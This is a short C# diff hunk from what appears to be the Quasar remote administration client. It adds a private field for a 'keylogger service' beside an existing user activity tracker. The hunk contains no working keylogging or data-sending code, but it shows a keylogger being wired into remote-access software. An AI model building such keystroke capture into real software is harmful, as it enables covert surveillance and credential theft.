@@ -41,6 +41,11 @@ namespace Quasar.Client
         /// Keeps track of the user activity.
         /// </summary>
         private ActivityDetection _userActivityDetection;
+        
+        /// <summary>
+        /// Service for keylogging functionality.
+        /// </summary>
+        private IDisposable _keyloggerService;
 
         /// <summary>
         /// Determines whether an installation is required depending on the current and target paths.
